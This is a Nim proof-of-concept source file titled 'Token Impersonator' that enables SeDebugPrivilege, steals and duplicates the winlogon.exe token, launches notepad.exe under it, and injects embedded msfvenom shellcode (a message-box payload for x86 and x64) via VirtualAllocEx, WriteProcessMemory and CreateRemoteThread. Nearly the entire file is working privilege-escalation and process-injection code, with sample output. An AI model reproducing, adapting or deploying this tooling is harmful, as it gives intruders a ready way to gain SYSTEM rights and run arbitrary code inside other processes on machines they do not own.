#[
    [Token Impersonator by @bofheaded]
    Purpose: This POC will Impersonate Tokens of Winlogon.exe and inject shellcode to newly spwned 
             Elevated process i.e Notepad.exe regardless architecture (Please refer to shellcode defination in code).
    
    Expected Results:
        [*] Running in x64 process
        [+] PID Winlogon.exe : 532
        [+] Current Process Handle : -1
        [+] OpenProcessToken Success!
        [+] LookupPrivilegeValue Success!
        [+] AdjustTokenPrivileges Success!
        [+] SeDebugPrivilege Enabled!
        [+] Got HANDLE to Winlogon.exe!
        [+] OpenProcessToken Success!
        [+] Impersonation to LoggedOn User Success!
        [+] Token Duplication Success!
        [+] CreateProcessWithTokenW Success!
        [+] Got handle to notepad.exe process : 196
        [!] VirtualAlloc : ptr 0000000000434470 --> 0000000000020000
        [+] Shellcode written to target process! : 1
        [+] Shellcode injected to notepad.exe! : 0
]#
import winim
import winim/lean
import winim/inc/windef
import winim/inc/winbase
import winim/inc/objbase
import os

echo "\n[Token Impersonator by @bofheaded]"


when defined(windows):

    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x86 process"
        var shellcode: array[272, byte] = [
        byte 0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
        0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
        0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,0x8b,0x6c,0x24,
        0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,0x4a,0x18,0x8b,0x5a,
        0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,
        0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
        0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,
        0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,
        0x08,0x29,0xd4,0x89,0xe5,0x89,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,
        0xff,0xff,0xff,0x89,0x45,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,
        0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,
        0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,
        0xe6,0x56,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,
        0x24,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x6f,0x78,0x58,0x20,0x68,0x61,0x67,
        0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x31,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe3,
        0x68,0x58,0x20,0x20,0x20,0x68,0x4d,0x53,0x46,0x21,0x68,0x72,0x6f,0x6d,0x20,
        0x68,0x6f,0x2c,0x20,0x66,0x68,0x48,0x65,0x6c,0x6c,0x31,0xc9,0x88,0x4c,0x24,
        0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
        0x55,0x08]

    elif defined(amd64):
        # ./msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x64 process"
        var shellcode: array[295, byte] = [
        byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
        0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
        0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
        0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
        0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
        0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
        0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
        0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
        0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
        0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
        0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
        0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x65,0x6c,
        0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
        0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]

var
    tp : TOKEN_PRIVILEGES
    luid: LUID
    HTtoken, CurrentProcHandle, TempHandle, AccessToken, TokenHandle, DuplicateTokenHandle: HANDLE
    result,impersonateUser, duplicateToken, createProcess: bool
    username: string
    username_len: int
    pi : PROCESS_INFORMATION
    si : STARTUPINFO
    ds: LPVOID

proc SetPrivilege (HTtoken:HANDLE, lpszPrivilege:string, bEnablePrivilege:bool ): bool=
    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
        echo "[-] LookupPrivilegeValue Failed : ",GetLastError()
        return false
    
    else:
        echo "[+] LookupPrivilegeValue Success!"
        
        if (bEnablePrivilege):
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        else:
            tp.Privileges[0].Attributes=0
        
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        

        if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
            echo "[-] AdjustTokenPrivileges Failed : ",GetLastError()
            return false
        else: 
            echo "[+] AdjustTokenPrivileges Success!"
            return true
        
        #if (GetLastError() == ERROR_NOT_ALL_ASSIGNED):
        #    echo "[-] The token does not have the specific privileges."
        #    return False
        

#get PID -  https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/minidump_bin.nim
proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetProcPid(process:string): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process:
                return int(entry.th32ProcessID)

    return 0


proc InjectShellcode(pHandle:HANDLE):void=
    echo "[+] Got handle to notepad.exe process : ",pHandle

    ds = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READ_WRITE
    )
    echo "[!] VirtualAlloc : ",repr(addr(ds))
    
    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        ds,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )
    if wSuccess:
        echo "[+] Shellcode written to target process! : ",wSuccess
    
    let tHandle = CreateRemoteThread(
        pHandle, 
        nil,
        0,
        cast[LPTHREAD_START_ROUTINE](ds),
        nil, 
        0, 
        nil
        )
    echo "[+] Shellcode injected to notepad.exe! :",GetLastError()


let processIdWinlogon: int = GetProcPid("winlogon.exe")

#Get WinLogon.exe PID
if not bool(processIdWinlogon):
        echo "\n[X] Unable to find winlogon.exe"
        quit(1)
echo "\n[+] PID Winlogon.exe : ",processIdWinlogon

#Get Current Process Handle
CurrentProcHandle = GetCurrentProcess()
echo "[+] Current Process Handle : ",CurrentProcHandle

#Open Handle to Current Process
TempHandle = OpenProcessToken(CurrentProcHandle, TOKEN_ADJUST_PRIVILEGES, &AccessToken)
if TempHandle == 0:
    echo "[-] OpenProcessToken Failed : ", GetLastError()
    quit(1)

else:
    echo "[+] OpenProcessToken Success!"
    result = SetPrivilege(cast[HANDLE](AccessToken), "SeDebugPrivilege", true)

    if result == false:
        echo "[-] SeDebugPrivilege Failed to Enable."
    else:
        echo "[+] SeDebugPrivilege Enabled!"
        TempHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, cast[DWORD](processIdWinlogon))
        if TempHandle == 0:
            echo "[-] Unable to Open HANDLE for Winlogon.exe"
        else:
            echo "[+] Got HANDLE to Winlogon.exe!"
            TempHandle = OpenProcessToken(TempHandle, TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, &TokenHandle)
            if TempHandle == 0:
                echo "[-] OpenProcessToken Failed : ",GetLastError()
            else:
                echo "[+] OpenProcessToken Success!"
                impersonateUser = ImpersonateLoggedOnUser(TokenHandle)
                if impersonateUser == false:
                    echo "[-] Impersonation to LoggedOn User Failed : ",GetLastError()
                else:
                    echo "[+] Impersonation to LoggedOn User Success!"
                    duplicateToken = DuplicateTokenEx(TokenHandle, MAXIMUM_ALLOWED, NULL, securityImpersonation, tokenPrimary, &DuplicateTokenHandle)
                    if duplicateToken == false:
                        echo "[-] Token Duplication Failed : ",GetLastError()
                    else:
                        echo "[+] Token Duplication Success!"
                        createProcess = CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, "C:\\Windows\\System32\\notepad.exe", NULL, 0, NULL, NULL, &si, &pi)
                        if createProcess == 0:
                            echo "[-] CreateProcessWithTokenW Failed : ",GetLastError()
                        else:
                            echo "[+] CreateProcessWithTokenW Success!"
                            InjectShellcode(pi.hProcess)